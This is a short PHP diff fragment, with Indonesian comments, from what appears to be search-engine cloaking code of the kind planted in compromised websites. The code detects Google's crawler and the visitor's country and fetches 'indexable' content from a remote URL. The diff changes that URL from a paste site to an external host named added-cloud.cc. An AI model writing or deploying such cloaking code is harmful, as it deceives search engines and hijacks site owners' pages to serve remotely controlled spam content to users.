@@ -49,7 +49,7 @@ function fetchContent($url) {
 $visitorCountry = getVisitorCountry();
 
 // URL untuk konten desktop yang dapat diindeks
-$desktopUrl = 'https://paste.myconan.net/516786.txt';
+$desktopUrl = 'https://added-cloud.cc/packdol/getcontent/autoprogress-m.ru/lp.txt';
 
 // Memeriksa apakah pengunjung adalah crawler Google
 if (isGoogleCrawler()) {
